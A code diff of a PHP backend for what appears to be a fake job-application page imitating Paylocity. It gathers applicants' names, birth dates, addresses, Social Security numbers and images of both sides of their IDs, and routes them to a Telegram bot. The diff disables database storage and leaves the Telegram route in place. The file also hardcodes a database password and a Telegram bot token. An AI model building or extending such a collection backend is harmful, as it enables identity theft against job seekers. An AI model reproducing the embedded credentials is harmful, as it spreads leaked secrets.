@@ -1,5 +1,5 @@
 <?php
-$db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
+// $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
 // Telegram configuration
 define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
@@ -54,25 +54,25 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
     // Save to PostgreSQL
-    $conn = pg_connect("host=".DB_HOST." port=".DB_PORT." dbname=".DB_NAME." user=".DB_USER." password=".DB_PASS);
+    // $conn = pg_connect("host=".DB_HOST." port=".DB_PORT." dbname=".DB_NAME." user=".DB_USER." password=".DB_PASS);
     
-    if (!$conn) {
-        die("Database connection failed: " . pg_last_error());
-    }
+    // if (!$conn) {
+    //     die("Database connection failed: " . pg_last_error());
+    // }
 
-    $query = "INSERT INTO submissions 
-                (full_name, birth_date, address, email, phone, position_applied, job_type, source, ssn, front_id, back_id, submitted_at) 
-              VALUES 
-                ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)";
-    $result = pg_query_params($conn, $query, array($full_name, $birth_date, $address, $email, $phone, $position, $job_type, $source, $ssn, $front_id_path, $back_id_path, $timestamp));
+    // $query = "INSERT INTO submissions 
+    //             (full_name, birth_date, address, email, phone, position_applied, job_type, source, ssn, front_id, back_id, submitted_at) 
+    //           VALUES 
+    //             ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)";
+    // $result = pg_query_params($conn, $query, array($full_name, $birth_date, $address, $email, $phone, $position, $job_type, $source, $ssn, $front_id_path, $back_id_path, $timestamp));
 
-    if ($result) {
-        echo "Submission successful!<br>";
-    } else {
-        echo "Error: " . pg_last_error($conn);
-    }
+    // if ($result) {
+    //     echo "Submission successful!<br>";
+    // } else {
+    //     echo "Error: " . pg_last_error($conn);
+    // }
 
-    pg_close($conn);
+    // pg_close($conn);
 
     // Prepare message for Telegram
     $telegram_message = "📝 *New Job Application*\n\n".
